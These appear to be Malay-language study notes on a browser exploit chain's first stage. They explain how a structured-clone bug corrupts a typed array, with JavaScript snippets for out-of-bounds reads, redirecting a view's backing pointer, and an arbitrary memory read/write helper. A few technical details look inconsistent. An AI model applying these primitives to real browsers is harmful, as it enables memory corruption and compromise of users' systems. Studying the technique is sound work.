# Layer 1: Browser Engine → Arbitrary R/W Userland

---

## Konsep Asas: Memory

RAM = baris panjang kotak. Setiap kotak ada **address** (nombor).

```
Address:  100   101   102   103
         [ 41 ][ 42 ][ 00 ][ FF ]
```

**Type = cara baca bytes.** Sama bits, beza interpretation:

```
Bytes: [ 3F ][ F1 ][ 99 ][ 99 ][ 99 ][ 99 ][ 9A ][ 00 ]

Baca as float64  → 1.1
Baca as int64    → 4607632778762754560
Baca as pointer  → 0x3FF199999999A00
```

---

## JS Object Layout Dalam Memory

```javascript
let obj = { x: 99.0 };
```

```
obj (address 0x2000):
┌──────────────────────────────┐
│ +0:  type tag                │
│ +8:  butterfly ptr           │  ← extra properties (kalau overflow)
│ +16: x = 99.0 (INLINE)       │  ← terus dalam obj, no extra ptr
└──────────────────────────────┘
```

```javascript
let f64 = new Float64Array([1.1, 2.2, 3.3]);
```

```
f64 (address 0x3000):
┌──────────────────────────────┐
│ +0:  type tag                │
│ +8:  length = 3              │
│ +16: backing store ptr →     │  ← point ke data sebenar
└──────────────────────────────┘
address 0x4000: [ 1.1 ][ 2.2 ][ 3.3 ]
```

**Perbezaan:** Object ada inline value dekat +16. Float64Array ada **pointer ke data** dekat +16.

---

## Bug: JIT Type Confusion (Konsep)

JIT compiler "hafal" type untuk optimize. Bila kita bagi type lain, dia masih run code lama.

```
JIT train dengan Float64Array 10,000x
→ JIT compile: "offset +16 = data pointer, deref, baca"

Lepas tu bagi JSObject:
→ JIT masih baca +16 sebagai data pointer
→ +16 of obj = obj.x (inline value)
→ JIT pergi ke alamat obj.x
→ baca dari sana
```

**Kita control `obj.x` → kita control mana JIT pergi.**

---

## int_to_float / float_to_int

Sama bits, beza cara baca. Guna shared ArrayBuffer:

```javascript
const scratchBits   = new ArrayBuffer(8);
const scratchBytes  = new Uint8Array(scratchBits);   // view as bytes
const scratchWords  = new Uint32Array(scratchBits);  // view as integers
const scratchDouble = new Float64Array(scratchBits); // view as float

// int → float:
scratchWords[0] = 0x1234;   // tulis as int
scratchDouble[0];            // baca as float → same bits, float form

// float → int:
scratchDouble[0] = someFloat;
scratchWords[0];             // baca as int → dapat raw address
```

---

## addrOf() — Dapat Address Sebarang Object

```
jsarray = [B]
→ jsarray simpan raw pointer ke B dalam butterfly

f64 overlap dengan jsarray butterfly (via bug)
→ f64[0] baca raw pointer sebagai float
→ convert float → int = address B ✓
```

---

## Bug Sebenar: Structured Clone Mismatch

Bug sebenar bukan JIT confusion — tapi **structured clone mismatch**.

```javascript
history.replaceState(outerGraph, "");  // simpan dalam history
clone = history.state;                  // bug corrupt satu Uint8Array
candidate = clone[DUPLICATE_INDEX];    // ← array yang kena corrupt (OOB!)
```

---

## Memory Layout SEBELUM Bug

```
candidate HEADER (0x1000):
┌──────────────────────────────────┐
│ +0:  type tag                    │
│ +8:  length = 16                 │
│ +16: backing store ptr → 0x3000  │ ← point ke data candidate sendiri
└──────────────────────────────────┘

candidate DATA (0x3000):
[ 0 ][ 1 ][ 2 ]...[ 15 ]   ← 16 bytes, normal


memoryView HEADER (0x2000):
┌──────────────────────────────────┐
│ +0:  type tag                    │
│ +8:  length = 256                │
│ +16: backing store ptr → 0x4000  │ ← point ke data memoryView sendiri
└──────────────────────────────────┘

memoryView DATA (0x4000):
[ 0 ][ 1 ][ 2 ]...[ 255 ]  ← 256 bytes, normal
```

---

## Memory Layout LEPAS Bug

```
candidate HEADER (0x1000):
┌──────────────────────────────────┐
│ +0:  type tag                    │
│ +8:  length = 16                 │
│ +16: backing store ptr → 0x2000  │ ← CORRUPT! point ke memoryView HEADER
└──────────────────────────────────┘
                                ↓
memoryView HEADER (0x2000):    ← candidate baca/tulis bermula dari sini
┌──────────────────────────────────┐
│ byte 0:   type tag byte 0        │ ← candidate[0]
│ byte 1:   type tag byte 1        │ ← candidate[1]
│ ...                              │
│ byte 16:  backing store ptr[0]   │ ← candidate[0x10] ← INI yang kita nak!
│ byte 17:  backing store ptr[1]   │ ← candidate[0x11]
│ ...                              │
│ byte 23:  backing store ptr[7]   │ ← candidate[0x17]
└──────────────────────────────────┘
```

---

## redirectView() — Redirect memoryView ke Mana-Mana Address

Nak redirect memoryView pergi ke `0xFFFF1234`:

```javascript
function redirectView(candidate, address) {
    // Step 1: Tukar address → bytes dalam scratchBytes
    scratchWords[0] = 0xFFFF1234;  // low 32 bits
    scratchWords[1] = 0x00000000;  // high 32 bits
    // scratchBytes = [ 34, 12, FF, FF, 00, 00, 00, 00 ]

    // Step 2: Tulis bytes tu ke candidate[0x10..0x17]
    // = overwrite memoryView backing store ptr
    for (let i = 0; i < 8; ++i) candidate[0x10 + i] = scratchBytes[i];
}
```

```
Selepas redirectView(candidate, 0xFFFF1234):

memoryView HEADER (0x2000):
┌──────────────────────────────────┐
│ +0:  type tag                    │
│ +8:  length = 256                │
│ +16: backing store ptr → 0xFFFF1234  ← BERTUKAR!
└──────────────────────────────────┘

memoryView[0]       → baca dari 0xFFFF1234  ✓  arbitrary read
memoryView[0] = val → tulis ke 0xFFFF1234   ✓  arbitrary write
```

---

## createMemoryWindow() — Final Arbitrary R/W API

```javascript
const mem = createMemoryWindow(holderAddress);

mem.setAddress(0xFFFF1234);  // aim ke address yang nak baca/tulis
mem.bytes[0];                // baca byte pertama dari 0xFFFF1234
mem.bytes[0] = 0x90;         // tulis ke 0xFFFF1234
mem.resetAddress();          // restore balik
```

---

## Cara Dapat Address Pertama (Bootstrap)

Masalah awal: kita tak tahu address apa-apa lagi. Macam mana nak start?

**Jawapan: candidate OOB scan.**

Diorang sengaja allocate `candidate` dan `memoryView` bersebelahan dalam memory:

```
Memory (bersebelahan):
[ candidate data - 16 bytes ][ memoryView HEADER - 48 bytes ][ memoryView data ]
      0x1000                        0x1010                        0x4000
```

Lepas bug bagi OOB, candidate boleh baca bytes selepas dia — terus masuk memoryView header:

```javascript
// Baca 48 bytes via OOB — automatik masuk memoryView header
readBytes(viewHeader, candidate, 48);

// viewHeader sekarang mengandungi raw bytes memoryView header:
// byte 0-7:   type tag
// byte 8-15:  length
// byte 16-23: backing store ptr  ← ADDRESS memoryView data ada dekat sini!
```

Gabung 8 bytes dekat offset 16:

```javascript
// Contoh bytes yang dibaca:
// viewHeader[16] = 0x00
// viewHeader[17] = 0x40
// viewHeader[22] = 0x3A
// viewHeader[23] = 0x7F
// Gabung = 0x00007F3A44024000 = address memoryView data ✓
```

---

## Cara Navigate Ke Addresses Lain

Lepas dapat address pertama, boleh ikut rantai pointer:

```
memoryView redirect → 0x00007F3A44024000
        ↓
memoryView[0..7]   → gabung → address object A
memoryView[8..15]  → gabung → address object B
        ↓
redirect lagi ke object A → baca pointer dalam situ
        ↓
redirect lagi → jumpa kernel address
        ↓
arbitrary R/W kernel memory ✓
```

Setiap object dalam memory pegang pointer ke objects lain. Ikut pointer dari satu ke satu sampai jumpa apa yang kita nak.

---

## Flow Penuh Layer 1

```
Structured clone bug
        ↓
candidate OOB → scan bytes sebelah → dapat address memoryView
        ↓
candidate[0x10+i] = address baru → redirect memoryView
        ↓
memoryView[0..7] → baca pointer dalam object → dapat address lain
        ↓
redirect lagi → ikut rantai pointer
        ↓
jumpa kernel address → arbitrary R/W userland memory ✓
        ↓
boleh trigger kernel syscall (Layer 2)
```
